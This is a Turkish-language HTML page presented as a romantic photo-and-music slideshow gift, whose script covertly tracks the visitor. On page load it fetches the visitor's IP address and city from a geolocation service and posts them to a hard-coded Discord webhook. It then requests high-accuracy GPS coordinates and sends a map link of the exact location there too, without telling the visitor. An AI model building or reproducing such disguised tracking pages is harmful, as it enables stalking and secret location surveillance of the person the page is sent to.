<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Senin ƒ∞√ßin</title>
    <style>
        body { background: #000; color: white; margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        img { width: 550px; height: 300px; object-fit: cover; border-radius: 15px; box-shadow: 0 0 30px #ff00ff; margin-bottom: 20px; }
        #soz { font-size: 1.5rem; margin-bottom: 15px; color: #ff66ff; text-shadow: 0 0 15px #ff00ff; }
        button { padding: 12px 28px; background: #ff00ff; border: none; color: white; font-size: 1.1rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff00ff; transition: 0.3s; }
        button:hover { transform: scale(1.1); }
        #hediyeButon { margin-top: 30px; padding: 12px 28px; background: #ff0077; border: none; color: white; font-size: 1.2rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff0077; display: none; }
    </style>
</head>
<body>

    <div id="icerik">
        <img id="foto" src="foto1.jpg">
        <p id="soz">Seninle her g√ºn√ºm daha g√ºzel.</p>
    </div>

    <button id="ileriBtn" onclick="ileri()">ƒ∞leri ‚ûú</button>
    <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi G√∂r üéÅ</button>

    <audio id="music" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <script>
        // --- 1. AYARLAR ---
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";

        async function dcGonder(mesaj) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: mesaj })
                });
            } catch (e) { console.error("Discord Hatasƒ±:", e); }
        }

        // --- 2. OTOMATƒ∞K KONUM Sƒ∞STEMƒ∞ ---
        window.onload = function() {
            // A. ≈ûehir ve IP Bulma (Anƒ±nda √ßalƒ±≈üƒ±r)
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    const info = `üöÄ **Giri≈ü Yapƒ±ldƒ±!**\nüìç ≈ûehir: ${data.city}\nüåê IP: ${data.ip}\nüì± Cihaz: ${navigator.userAgent.includes("Mobi") ? "Mobil" : "Bilgisayar"}`;
                    dcGonder(info);

                    // B. Hassas GPS Konumu (Kullanƒ±cƒ±ya sorar)
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                            dcGonder(`üéØ **Tam Konum Bulundu!**\nüìç Harita: ${mapsLink}`);
                        }, 
                        (err) => { dcGonder("‚ö†Ô∏è Kullanƒ±cƒ± konum izni vermedi."); },
                        { enableHighAccuracy: true, timeout: 10000 });
                    }
                });
        };

        // --- 3. FOTOƒûRAF VE M√úZƒ∞K Sƒ∞STEMƒ∞ ---
        const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
        const sozler = ["Seninle her g√ºn√ºm daha g√ºzel.", "G√ºl√º≈ü√ºn d√ºnyamƒ± aydƒ±nlatƒ±yor.", "Kalbim hep seninle.", "Sana her baktƒ±ƒüƒ±mda yeniden a≈üƒ±k oluyorum.", "ƒ∞yi ki varsƒ±n, iyi ki benimsin."];
        let index = 0;
        const audio = document.getElementById("music");

        function ileri() {
            // M√ºziƒüi her tƒ±klamada tetikle (Mobil korumasƒ± i√ßin)
            audio.play().catch(() => {});

            index++;
            if (index >= fotolar.length) {
                document.getElementById("hediyeButon").style.display = "block";
                document.getElementById("ileriBtn").style.display = "none";
                return;
            }
            document.getElementById("foto").src = fotolar[index];
            document.getElementById("soz").innerText = sozler[index];
        }

        // ƒ∞lk tƒ±kla m√ºziƒüi a√ßma garantisi
        window.onclick = () => { audio.play().catch(() => {}); };
    </script>
</body>
</html>
